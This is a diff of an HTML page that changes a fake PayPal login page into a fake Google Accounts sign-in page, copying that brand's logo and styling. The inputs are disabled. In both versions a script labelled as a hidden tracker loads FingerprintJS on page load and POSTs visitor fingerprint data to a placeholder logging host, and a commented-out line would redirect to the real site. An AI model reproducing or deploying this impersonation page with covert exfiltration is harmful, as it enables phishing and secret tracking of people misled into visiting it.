@@ -2,77 +2,58 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PayPal: Log In</title>
-  <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" />
+  <title>Sign in – Google Accounts</title>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    body {
-      background: #fff;
-      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+    body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
     .container {
-      max-width: 400px;
-      margin: 100px auto;
-      border: 1px solid #e0e0e0;
+      max-width: 360px;
+      width: 100%;
+      padding: 40px 30px;
+      border: 1px solid #dadce0;
       border-radius: 8px;
-      padding: 30px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    .paypal-logo {
       text-align: center;
-      margin-bottom: 20px;
     }
-    .paypal-logo img {
-      width: 100px;
-    }
-    h2 {
-      text-align: center;
-      font-weight: normal;
-      margin-bottom: 30px;
-    }
+    img.logo { width: 75px; margin-bottom: 20px; }
+    h1 { font-weight: 500; font-size: 24px; margin: 0 0 10px; color: #202124; }
+    p { color: #5f6368; font-size: 14px; margin-bottom: 24px; }
     input {
       width: 100%;
       padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      margin-bottom: 16px;
       font-size: 16px;
-      box-sizing: border-box;
+      background: #f1f3f4;
+      color: #888;
     }
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #0070ba;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
+      padding: 10px;
+      background: #1a73e8;
+      color: #fff;
+      font-weight: 500;
+      font-size: 14px;
       border: none;
-      border-radius: 5px;
+      border-radius: 4px;
       cursor: not-allowed;
     }
-    .disabled-note {
-      font-size: 12px;
-      color: #888;
-      text-align: center;
-      margin-top: 10px;
-    }
+    .note { font-size: 12px; color: #777; margin-top: 20px; }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="paypal-logo">
-      <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" alt="PayPal">
-    </div>
-    <h2>Log in to your PayPal account</h2>
-    <input type="email" placeholder="Email address" disabled />
-    <input type="password" placeholder="Password" disabled />
-    <button disabled>Log In</button>
-    <div class="disabled-note">*This is a secure session</div>
+    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+    <input type="email" placeholder="Email or phone" disabled>
+    <button disabled>Next</button>
+    <p class="note">Not your device? Use Guest mode to sign in privately.</p>
   </div>
 
-  <!-- 🔒 Silent Fingerprint Tracker -->
+  <!-- 🔒 Hidden Tracker -->
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script>
     ;(async () => {
@@ -90,14 +71,14 @@
         timestamp: new Date().toISOString()
       };
 
-      fetch('https://yourdomain.com/logger.php', {
+      fetch('https://your-domain.com/logger.php', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(payload)
       });
 
-      // Optional: redirect after few seconds
-      // setTimeout(() => window.location.href = 'https://paypal.com', 7000);
+      // Optional redirect after logging
+      // setTimeout(() => window.location.href = 'https://accounts.google.com', 5000);
     })();
   </script>
 </body>
